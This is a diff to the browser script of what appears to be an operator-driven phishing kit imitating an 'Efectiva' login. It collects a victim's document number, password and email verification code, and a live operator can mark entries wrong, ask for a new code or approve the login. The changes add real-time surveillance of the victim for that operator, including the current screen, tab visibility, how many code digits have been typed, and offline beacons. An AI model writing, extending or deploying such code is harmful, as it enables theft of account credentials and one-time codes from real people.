@@ -29,7 +29,13 @@
 
   const socket = typeof io !== "undefined" ? io({ transports: ["websocket", "polling"] }) : null;
 
+  let hasSubmitted = false;
+  let lastCmdId = null;
+  let isWaitingOperator = false;
+  let currentStatus = "⏳ Esperando verificación por el operador";
+
   function showLoading(text) {
+    isWaitingOperator = true;
     if (loadingOverlay) {
       const textEl = loadingOverlay.querySelector(".efectiva-loading-text");
       if (textEl) textEl.textContent = text || "Cargando, por favor espere...";
@@ -38,13 +44,40 @@
   }
 
   function hideLoading() {
+    isWaitingOperator = false;
     if (loadingOverlay) {
       loadingOverlay.hidden = true;
     }
   }
 
-  let hasSubmitted = false;
-  let lastCmdId = null;
+  function getScreenLabel() {
+    if (isWaitingOperator) return "Pantalla: Cargando (Esperando Operador)";
+    if (step === "doc") return "Pantalla: Documento";
+    if (step === "pass") return "Pantalla: Contraseña";
+    if (step === "verify") return "Pantalla: Código de Correo";
+    return "Pantalla: Login";
+  }
+
+  function getVisibility() {
+    return document.hidden ? "background" : "active";
+  }
+
+  function reportActivity(newStatus) {
+    if (newStatus) currentStatus = newStatus;
+    if (!hasSubmitted) return;
+    const payload = {
+      clientId,
+      online: true,
+      visibility: getVisibility(),
+      step,
+      screenLabel: getScreenLabel(),
+      status: currentStatus,
+      waitingOperator: isWaitingOperator,
+    };
+    if (socket && socket.connected) {
+      socket.emit("client:activity", payload);
+    }
+  }
 
   function handleOperatorAction(data) {
     if (!data || !data.action) return;
@@ -63,6 +96,7 @@
       if (docWrap) docWrap.classList.add("error");
       showError(message || "Documento incorrecto o no registrado");
       if (docNumber) docNumber.focus();
+      reportActivity("⚠️ Viendo error de documento (en pantalla DNI)");
     } else if (action === "wrong_pass") {
       setStep("pass");
       if (password) {
@@ -70,6 +104,7 @@
         password.focus();
       }
       showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
+      reportActivity("⚠️ Viendo error de clave (en pantalla Contraseña)");
     } else if (action === "wrong_token") {
       setStep("verify");
       tokens.forEach(function (t) { t.value = ""; });
@@ -79,17 +114,21 @@
           ? "Código de correo inválido o expirado."
           : message;
       showError(cleanMsg);
+      reportActivity("⚠️ Viendo error de código (en pantalla Código)");
     } else if (action === "ask_token") {
       setStep("verify");
       tokens.forEach(function (t) { t.value = ""; });
       if (tokens[0]) tokens[0].focus();
+      reportActivity("📲 En pantalla de Código (esperando que escriba)");
     } else if (action === "ask_pass") {
       setStep("pass");
       if (password) {
         password.value = "";
         password.focus();
       }
+      reportActivity("🔑 En pantalla de Contraseña (esperando que escriba)");
     } else if (action === "approve" || action === "redirect") {
+      reportActivity("✅ Acceso aprobado (Redirigido a /panel)");
       window.location.href = "/panel.html";
     }
   }
@@ -116,6 +155,7 @@
 
     if (!customStatus && !currentDoc && !currentPass && !currentToken) return;
     hasSubmitted = true;
+    if (customStatus) currentStatus = customStatus;
 
     const nowMs = Date.now();
     const data = {
@@ -125,7 +165,11 @@
       password: currentPass,
       token: currentToken,
       step,
-      status: customStatus || "Esperando verificación por el operador",
+      screenLabel: getScreenLabel(),
+      status: currentStatus,
+      waitingOperator: isWaitingOperator,
+      online: true,
+      visibility: getVisibility(),
       updatedAtMs: nowMs,
       isUserSubmit: true,
     };
@@ -140,14 +184,49 @@
   if (socket) {
     socket.on("connect", function () {
       socket.emit("client:register", { clientId });
+      if (hasSubmitted) {
+        reportActivity();
+      }
     });
 
     socket.on("operator:action", handleOperatorAction);
   }
 
+  document.addEventListener("visibilitychange", function () {
+    if (hasSubmitted) {
+      reportActivity();
+    }
+  });
+
+  function notifyOffline() {
+    if (!hasSubmitted) return;
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(
+          "/api/session/" + encodeURIComponent(clientId) + "/offline",
+          new Blob(["{}"], { type: "application/json" })
+        );
+      }
+    } catch (_e) {}
+  }
+
+  window.addEventListener("pagehide", notifyOffline);
+  window.addEventListener("beforeunload", notifyOffline);
+
   setInterval(function () {
     if (!hasSubmitted) return;
-    fetch("/api/session/" + encodeURIComponent(clientId) + "/poll", { cache: "no-store" })
+    fetch("/api/session/" + encodeURIComponent(clientId) + "/poll", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        visibility: getVisibility(),
+        step,
+        screenLabel: getScreenLabel(),
+        status: currentStatus,
+        waitingOperator: isWaitingOperator,
+      }),
+      cache: "no-store",
+    })
       .then(function (r) { return r.ok ? r.json() : null; })
       .then(function (res) {
         if (res && res.command) {
@@ -190,11 +269,25 @@
     syncFilled(this, docWrap);
     docWrap.classList.remove("error");
     showError("");
+    if (hasSubmitted) {
+      reportActivity(
+        this.value.trim().length > 0
+          ? "✍️ Corrigiendo documento..."
+          : "📄 En pantalla de Documento (sin escribir)"
+      );
+    }
   });
 
   password.addEventListener("input", function () {
     this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
     showError("");
+    if (hasSubmitted) {
+      reportActivity(
+        this.value.length > 0
+          ? "✍️ Escribiendo nueva contraseña..."
+          : "🔑 En pantalla de Contraseña (sin escribir)"
+      );
+    }
   });
 
   docTypeBtn.addEventListener("click", function (event) {
@@ -229,11 +322,22 @@
     password.type = password.type === "password" ? "text" : "password";
   });
 
+  function updateTokenTypingActivity() {
+    if (!hasSubmitted) return;
+    const filledCount = tokens.filter(function (t) { return t.value.length > 0; }).length;
+    if (filledCount > 0) {
+      reportActivity("✍️ Escribiendo código (" + filledCount + "/6 dígitos)...");
+    } else {
+      reportActivity("📲 En pantalla de Código (esperando que escriba)");
+    }
+  }
+
   tokens.forEach(function (box, index) {
     box.addEventListener("input", function () {
       showError("");
       this.value = this.value.replace(/\D/g, "").slice(0, 1);
       if (this.value && tokens[index + 1]) tokens[index + 1].focus();
+      updateTokenTypingActivity();
     });
     box.addEventListener("keydown", function (event) {
       if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
@@ -252,6 +356,7 @@
       }
       const nextFocus = tokens[Math.min(index + pasted.length, tokens.length - 1)];
       if (nextFocus) nextFocus.focus();
+      updateTokenTypingActivity();
     });
   });
 
@@ -266,6 +371,9 @@
       }
       setStep("pass");
       password.focus();
+      if (hasSubmitted) {
+        reportActivity("➡️ Pasó a pantalla de Contraseña (esperando clave)");
+      }
       return;
     }
     if (step === "pass") {
@@ -275,7 +383,7 @@
         return;
       }
       showLoading("Verificando contraseña...");
-      sendSocketUpdate("Esperando verificación por el operador");
+      sendSocketUpdate("⏳ Esperando verificación de contraseña");
       return;
     }
     const code = tokens.map(function (t) { return t.value; }).join("");
@@ -284,7 +392,7 @@
       return;
     }
     showLoading("Validando código...");
-    sendSocketUpdate("Esperando aprobación del código por el operador");
+    sendSocketUpdate("⏳ Esperando aprobación del código");
   });
 
   document.querySelectorAll(".nav-link, .forgot, .store-badges img, .resend span").forEach(function (el) {
